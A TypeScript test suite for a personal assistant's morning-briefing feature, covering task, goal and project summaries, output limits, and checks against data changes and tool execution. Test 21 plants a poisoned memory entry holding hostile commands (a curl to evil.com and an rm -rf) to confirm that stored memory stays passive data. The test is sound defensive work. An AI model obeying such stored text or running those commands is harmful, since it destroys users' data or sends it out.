/**
 * ALFRED Phase 5.8B — Morning Briefing Test Suite
 *
 * Verifies all 28 mandatory requirements:
 * 1. Morning briefing detects correctly.
 * 2. Non-briefing commands are unaffected.
 * 3. Fresh AgentContext is used.
 * 4. Overdue tasks are identified correctly.
 * 5. Due-today tasks are identified correctly.
 * 6. High-priority tasks are identified correctly.
 * 7. Pending tasks are bounded.
 * 8. Active projects are included.
 * 9. Active goals are included.
 * 10. Focus state is included correctly.
 * 11. Recent activity is bounded.
 * 12. Relevant memory is included.
 * 13. Irrelevant memory is excluded.
 * 14. Recommendations are integrated.
 * 15. Available routines are listed correctly.
 * 16. Empty state works.
 * 17. No fake statistics are generated.
 * 18. No mutations occur.
 * 19. No ToolRegistry execution occurs.
 * 20. Sensitive data is not exposed.
 * 21. Malicious memory content remains passive data.
 * 22. TTS output contains no internal metadata.
 * 23. Existing commands continue working.
 * 24. RecommendationAgent continues working.
 * 25. ProactiveAgent continues working.
 * 26. Agentic planning continues working.
 * 27. Routine engine continues working.
 * 28. Voice/wake/TTS remain compatible.
 */

import assert from "assert";
import * as path from "path";
import * as fs from "fs";
import { commandAgentService } from "../electron/agent/command-agent.service";
import { morningBriefingService } from "../electron/agent/briefing";
import { taskService, Task } from "../electron/services/task.service";
import { projectService, Project } from "../electron/services/project.service";
import { goalService, Goal } from "../electron/services/goal.service";
import { memoryService } from "../electron/agent/memory/memory.service";
import { toolRegistry } from "../electron/agent/tools/tool-registry";
import { confirmationStore } from "../electron/agent/risk/confirmation-store";
import { proactiveAgentService } from "../electron/agent/proactive/proactive-agent.service";
import { recommendationAgentService } from "../electron/agent/recommendation/recommendation-agent.service";
import { agentContextService } from "../electron/agent/agent-context/agent-context.service";
import { formatSpokenResponse } from "../src/utils/responseSpeechFormatter";

const TEST_MEMORY_FILE = path.join(__dirname, "test-memories-briefing.json");

async function runTest(name: string, fn: () => Promise<void> | void) {
    try {
        await fn();
        console.log(`✅ [PASS] ${name}`);
    } catch (err: any) {
        console.error(`❌ [FAIL] ${name}`);
        console.error(err);
        process.exit(1);
    }
}

async function main() {
    console.log("==========================================================================");
    console.log("   RUNNING ALFRED PHASE 5.8B MORNING BRIEFING TEST SUITE                  ");
    console.log("==========================================================================");

    // Setup clean memory test file
    memoryService.setStoragePath(TEST_MEMORY_FILE);
    memoryService.clear();

    const initialTasks = taskService.getTasks();
    const initialProjects = projectService.getProjects();
    const initialGoals = goalService.getGoals();

    // 1. Morning briefing detects correctly
    await runTest("1. Morning briefing detects correctly", () => {
        const queries = [
            "Give me my morning briefing",
            "What's on my agenda today?",
            "What do I have today?",
            "How does my day look?",
            "Good morning Alfred",
            "Brief me",
            "Give me today's overview",
            "morning briefing",
            "what do I have planned for today",
        ];

        for (const q of queries) {
            const isBriefing = morningBriefingService.isBriefingQuery(q);
            assert.strictEqual(isBriefing, true, `Query "${q}" should detect as morning briefing query`);
        }
    });

    // 2. Non-briefing commands are unaffected
    await runTest("2. Non-briefing commands are unaffected", () => {
        const nonBriefing = [
            "open VS Code",
            "start coding mode",
            "create a task to review code",
            "what routines do you have?",
            "what should I work on now?",
            "remember that I prefer DSA",
            "system status",
        ];

        for (const cmd of nonBriefing) {
            const isBriefing = morningBriefingService.isBriefingQuery(cmd);
            assert.strictEqual(isBriefing, false, `Command "${cmd}" must NOT be detected as morning briefing`);
        }
    });

    // 3. Fresh AgentContext is used
    await runTest("3. Fresh AgentContext is used", () => {
        const now1 = new Date(2026, 8, 30, 9, 0, 0); // 9 AM local
        const briefing1 = morningBriefingService.generateBriefing({ now: now1 });
        assert.ok(briefing1.generatedAt, "Briefing must have generatedAt timestamp");
        assert.strictEqual(briefing1.greeting, "Good morning");

        const now2 = new Date(2026, 8, 30, 14, 0, 0); // 2 PM local
        const briefing2 = morningBriefingService.generateBriefing({ now: now2 });
        assert.strictEqual(briefing2.greeting, "Good afternoon");

        const now3 = new Date(2026, 8, 30, 19, 0, 0); // 7 PM local
        const briefing3 = morningBriefingService.generateBriefing({ now: now3 });
        assert.strictEqual(briefing3.greeting, "Good evening");
    });

    // 4. Overdue tasks are identified correctly
    await runTest("4. Overdue tasks are identified correctly", () => {
        const testTasks: Task[] = [
            { id: "ov1", text: "Past due task", completed: false, category: "DSA", dueDate: "2020-01-01" },
            { id: "fut1", text: "Future task", completed: false, category: "Personal", dueDate: "2099-01-01" },
            { id: "comp1", text: "Old completed task", completed: true, category: "DSA", dueDate: "2020-01-01" },
        ];

        const briefing = morningBriefingService.generateBriefing({
            now: new Date("2026-09-30T10:00:00"),
            context: { tasks: testTasks },
        });

        assert.strictEqual(briefing.counts.overdueTasks, 1);
        assert.strictEqual(briefing.overdueTasks.length, 1);
        assert.strictEqual(briefing.overdueTasks[0].text, "Past due task");
        assert.strictEqual(briefing.overdueTasks[0].isOverdue, true);
    });

    // 5. Due-today tasks are identified correctly
    await runTest("5. Due-today tasks are identified correctly", () => {
        const testDate = new Date("2026-09-30T10:00:00");
        const todayStr = "2026-09-30";
        const testTasks: Task[] = [
            { id: "dt1", text: "Today task 1", completed: false, category: "DSA", dueDate: todayStr },
            { id: "dt2", text: "Completed today task", completed: true, category: "DSA", dueDate: todayStr },
        ];

        const briefing = morningBriefingService.generateBriefing({
            now: testDate,
            context: { tasks: testTasks },
        });

        assert.strictEqual(briefing.counts.dueTodayTasks, 1);
        assert.strictEqual(briefing.dueTodayTasks.length, 1);
        assert.strictEqual(briefing.dueTodayTasks[0].text, "Today task 1");
        assert.strictEqual(briefing.dueTodayTasks[0].isDueToday, true);
    });

    // 6. High-priority tasks are identified correctly
    await runTest("6. High-priority tasks are identified correctly", () => {
        const testTasks: Task[] = [
            { id: "hp1", text: "Crucial server fix", completed: false, category: "Personal", priority: "high" },
            { id: "lp1", text: "Low priority item", completed: false, category: "Personal", priority: "low" },
        ];

        const briefing = morningBriefingService.generateBriefing({
            now: new Date("2026-09-30T10:00:00"),
            context: { tasks: testTasks },
        });

        assert.strictEqual(briefing.counts.highPriorityTasks, 1);
        assert.strictEqual(briefing.highPriorityTasks[0].text, "Crucial server fix");
    });

    // 7. Pending tasks are bounded
    await runTest("7. Pending tasks are bounded", () => {
        const manyTasks: Task[] = [];
        for (let i = 1; i <= 20; i++) {
            manyTasks.push({
                id: `bulk_${i}`,
                text: `Bulk task ${i}`,
                completed: false,
                category: "Bulk",
                priority: "medium",
            });
        }

        const briefing = morningBriefingService.generateBriefing({
            now: new Date("2026-09-30T10:00:00"),
            context: { tasks: manyTasks },
            tasksLimit: 5,
        });

        assert.strictEqual(briefing.pendingTasks.length, 5, "Pending tasks list must be bounded to limit");
        assert.strictEqual(briefing.counts.totalPendingTasks, 20, "Total count must reflect real total");
    });

    // 8. Active projects are included
    await runTest("8. Active projects are included", () => {
        const testProjects: Project[] = [
            { id: "p1", name: "ALFRED OS", category: "Personal", status: "In Progress", progress: 40, description: "Active", createdDate: "2026-09-01" },
            { id: "p2", name: "Old Finished App", category: "Personal", status: "Completed", progress: 100, description: "Done", createdDate: "2026-08-01" },
        ];

        const briefing = morningBriefingService.generateBriefing({
            context: { projects: testProjects },
        });

        assert.strictEqual(briefing.counts.activeProjects, 1);
        assert.strictEqual(briefing.activeProjects.length, 1);
        assert.strictEqual(briefing.activeProjects[0].name, "ALFRED OS");
        assert.strictEqual(briefing.activeProjects[0].progress, 40);
    });

    // 9. Active goals are included
    await runTest("9. Active goals are included", () => {
        const testGoals: Goal[] = [
            { id: "g1", title: "Solve 20 Problems", type: "Weekly", target: 20, current: 8, completed: false },
            { id: "g2", title: "Completed Goal", type: "Weekly", target: 5, current: 5, completed: true },
        ];

        const briefing = morningBriefingService.generateBriefing({
            context: { goals: testGoals },
        });

        assert.strictEqual(briefing.counts.activeGoals, 1);
        assert.strictEqual(briefing.activeGoals[0].title, "Solve 20 Problems");
        assert.strictEqual(briefing.activeGoals[0].progressPercentage, 40);
    });

    // 10. Focus state is included correctly
    await runTest("10. Focus state is included correctly", () => {
        const briefing = morningBriefingService.generateBriefing({
            context: {
                focus: {
                    state: "idle",
                    todayFocusMinutes: 45,
                    totalFocusMinutes: 120,
                },
            },
        });

        assert.strictEqual(briefing.focusSummary.todayFocusMinutes, 45);
        assert.ok(briefing.focusSummary.description.includes("45 minutes"));
    });

    // 11. Recent activity is bounded
    await runTest("11. Recent activity is bounded", () => {
        const manyActivities = [
            { type: "task_completed", label: "Task 1", timestamp: Date.now() - 1000 },
            { type: "task_completed", label: "Task 2", timestamp: Date.now() - 2000 },
            { type: "task_completed", label: "Task 3", timestamp: Date.now() - 3000 },
            { type: "task_completed", label: "Task 4", timestamp: Date.now() - 4000 },
            { type: "task_completed", label: "Task 5", timestamp: Date.now() - 5000 },
        ];

        const briefing = morningBriefingService.generateBriefing({
            context: { activity: manyActivities },
        });

        assert.ok(briefing.recentActivity.length <= 4, "Recent activity must be strictly bounded");
    });

    // 12. Relevant memory is included
    await runTest("12. Relevant memory is included", () => {
        memoryService.clear();
        memoryService.save({
            category: "WORKFLOW_PREFERENCE",
            content: "I prefer working on DSA in the morning.",
        });

        const briefing = morningBriefingService.generateBriefing();
        assert.ok(briefing.relevantMemories.length > 0, "Briefing should include morning-relevant memory");
        assert.ok(
            briefing.relevantMemories.some((m) => m.content.includes("morning")),
            "Relevant memory content must be present"
        );
    });

    // 13. Irrelevant memory is excluded
    await runTest("13. Irrelevant memory is excluded", () => {
        memoryService.clear();
        memoryService.save({
            category: "USER_PREFERENCE",
            content: "My favorite dinner dish is lasagna.",
        });

        const briefing = morningBriefingService.generateBriefing();
        assert.strictEqual(
            briefing.relevantMemories.some((m) => m.content.includes("lasagna")),
            false,
            "Irrelevant dinner memory must be excluded from morning briefing"
        );
    });

    // 14. Recommendations are integrated
    await runTest("14. Recommendations are integrated", () => {
        const briefing = morningBriefingService.generateBriefing();
        assert.ok(Array.isArray(briefing.recommendations), "Recommendations list must exist");
        assert.ok(briefing.recommendations.length <= 3, "Recommendations must remain bounded (1-3)");
    });

    // 15. Available routines are listed correctly
    await runTest("15. Available routines are listed correctly", () => {
        const briefing = morningBriefingService.generateBriefing();
        assert.ok(briefing.availableRoutines.length >= 4, "Built-in routines must be present in briefing");
        const names = briefing.availableRoutines.map((r) => r.name);
        assert.ok(names.includes("Coding Mode"));
        assert.ok(names.includes("Data Science Mode"));
        assert.ok(names.includes("Machine Learning Mode"));
        assert.ok(names.includes("Hackathon Mode"));
    });

    // 16. Empty state works
    await runTest("16. Empty state works", () => {
        const briefing = morningBriefingService.generateBriefing({
            now: new Date("2026-09-30T09:00:00"),
            context: {
                tasks: [],
                projects: [],
                goals: [],
                focus: { todayFocusMinutes: 0, state: "idle" },
            },
        });

        assert.strictEqual(briefing.isEmpty, true, "Empty state flag must be true");
        assert.ok(
            briefing.summary.includes("You have no overdue tasks and nothing due today"),
            "Summary must handle empty state naturally"
        );
        assert.ok(
            briefing.spokenSummary.includes("You have no overdue tasks and nothing due today"),
            "Spoken summary must handle empty state naturally"
        );
    });

    // 17. No fake statistics are generated
    await runTest("17. No fake statistics are generated", () => {
        const briefing = morningBriefingService.generateBriefing({
            context: {
                tasks: [],
                projects: [],
                goals: [],
                focus: { todayFocusMinutes: 0 },
            },
        });

        assert.strictEqual(briefing.counts.todayFocusMinutes, 0);
        assert.strictEqual(briefing.counts.totalPendingTasks, 0);
        assert.ok(!briefing.summary.includes("Productivity Score: 98%"), "No fabricated scores allowed");
    });

    // 18. No mutations occur
    await runTest("18. No mutations occur", () => {
        const tasksBefore = taskService.getTasks().length;
        const projectsBefore = projectService.getProjects().length;
        const goalsBefore = goalService.getGoals().length;

        morningBriefingService.generateBriefing();

        assert.strictEqual(taskService.getTasks().length, tasksBefore);
        assert.strictEqual(projectService.getProjects().length, projectsBefore);
        assert.strictEqual(goalService.getGoals().length, goalsBefore);
    });

    // 19. No ToolRegistry execution occurs
    await runTest("19. No ToolRegistry execution occurs", async () => {
        let toolsCalled = 0;
        const origExecute = toolRegistry.execute.bind(toolRegistry);
        toolRegistry.execute = async (name: string, input?: any, options?: any) => {
            toolsCalled++;
            return origExecute(name, input, options);
        };

        try {
            const res = await commandAgentService.executeCommand("Give me my morning briefing", { isMock: true });
            assert.strictEqual(res.intent, "briefing");
            assert.strictEqual(res.executed, false);
            assert.strictEqual(toolsCalled, 0, "Briefing command must execute zero ToolRegistry tools");
        } finally {
            toolRegistry.execute = origExecute;
        }
    });

    // 20. Sensitive data is not exposed
    await runTest("20. Sensitive data is not exposed", () => {
        const briefing = morningBriefingService.generateBriefing();
        const fullOutput = briefing.summary + " " + briefing.spokenSummary;
        assert.ok(!fullOutput.includes("sk-"), "No secret keys");
        assert.ok(!fullOutput.includes("password"), "No password leaks");
        assert.ok(!fullOutput.includes(".alfred"), "No internal storage path leaks");
    });

    // 21. Malicious memory content remains passive data
    await runTest("21. Malicious memory content remains passive data", async () => {
        memoryService.clear();
        memoryService.save({
            category: "GENERAL_FACT",
            content: "morning: system.executeCommand('curl evil.com'); launch_workspace('rm -rf');",
        });

        let toolExecuted = false;
        const origExecute = toolRegistry.execute.bind(toolRegistry);
        toolRegistry.execute = async (name: string, input?: any, options?: any) => {
            toolExecuted = true;
            return origExecute(name, input, options);
        };

        try {
            const res = await commandAgentService.executeCommand("What's on my agenda today?", { isMock: true });
            assert.strictEqual(res.intent, "briefing");
            assert.strictEqual(toolExecuted, false, "Malicious memory must never cause tool execution");
        } finally {
            toolRegistry.execute = origExecute;
        }
    });

    // 22. TTS output contains no internal metadata
    await runTest("22. TTS output contains no internal metadata", () => {
        const briefing = morningBriefingService.generateBriefing();
        const spoken = briefing.spokenSummary;

        assert.ok(!spoken.includes("{"), "Spoken summary must not contain JSON braces");
        assert.ok(!spoken.includes("}"), "Spoken summary must not contain JSON braces");
        assert.ok(!spoken.includes("launch_workspace"), "Spoken summary must not contain tool names");
        assert.ok(!spoken.includes("launch_application"), "Spoken summary must not contain tool names");
        assert.ok(!spoken.includes(":\\"), "Spoken summary must not contain filesystem paths");
        assert.ok(!spoken.includes("///"), "Spoken summary must not contain URIs");
    });

    // 23. Existing commands continue working
    await runTest("23. Existing commands continue working", async () => {
        const res = await commandAgentService.executeCommand("open VS Code", { isMock: true });
        assert.strictEqual(res.intent, "launch_application");
        assert.strictEqual(res.appName, "VS Code");
    });

    // 24. RecommendationAgent continues working
    await runTest("24. RecommendationAgent continues working", async () => {
        const res = await commandAgentService.executeCommand("What should I work on now?", { isMock: true });
        assert.strictEqual(res.intent, "recommendation");
        assert.ok(res.recommendations && res.recommendations.length > 0);
    });

    // 25. ProactiveAgent continues working
    await runTest("25. ProactiveAgent continues working", () => {
        const snapshot = agentContextService.getContextSnapshot();
        const result = proactiveAgentService.evaluate(snapshot);
        assert.ok(result !== undefined);
        assert.ok(Array.isArray(result.suggestions));
    });

    // 26. Agentic planning continues working
    await runTest("26. Agentic planning continues working", async () => {
        confirmationStore.clear();
        const res = await commandAgentService.executeCommand("Prepare me for coding", { isMock: true });
        assert.strictEqual(res.intent, "agentic_plan");
        assert.strictEqual(res.requiresConfirmation, true);
        if (res.confirmationId) {
            await commandAgentService.cancelAction(res.confirmationId);
        }
    });

    // 27. Routine engine continues working
    await runTest("27. Routine engine continues working", async () => {
        confirmationStore.clear();
        const res = await commandAgentService.executeCommand("Start coding mode", { isMock: true });
        assert.strictEqual(res.intent, "agentic_plan");
        assert.strictEqual(res.requiresConfirmation, true);
        assert.strictEqual(res.routine?.id, "routine_coding_mode");
        if (res.confirmationId) {
            await commandAgentService.cancelAction(res.confirmationId);
        }
    });

    // 28. Voice/wake/TTS remain compatible
    await runTest("28. Voice/wake/TTS remain compatible", async () => {
        const briefingRes = await commandAgentService.executeCommand("Give me my morning briefing", { isMock: true });
        const spoken = formatSpokenResponse(briefingRes);
        assert.ok(spoken, "Speech formatter must return a spoken string for morning briefing");
        assert.ok(!spoken.includes("{"), "Spoken string must not have JSON");
        assert.ok(spoken.includes("Good morning") || spoken.includes("Good afternoon") || spoken.includes("Good evening"));
    });

    // Clean up test file
    try {
        if (fs.existsSync(TEST_MEMORY_FILE)) {
            fs.unlinkSync(TEST_MEMORY_FILE);
        }
    } catch {}

    console.log("==========================================================================");
    console.log("   ALL 28 MORNING BRIEFING TESTS PASSED SUCCESSFULLY!                     ");
    console.log("==========================================================================");
}

main().catch((err) => {
    console.error("Fatal test error:", err);
    process.exit(1);
});
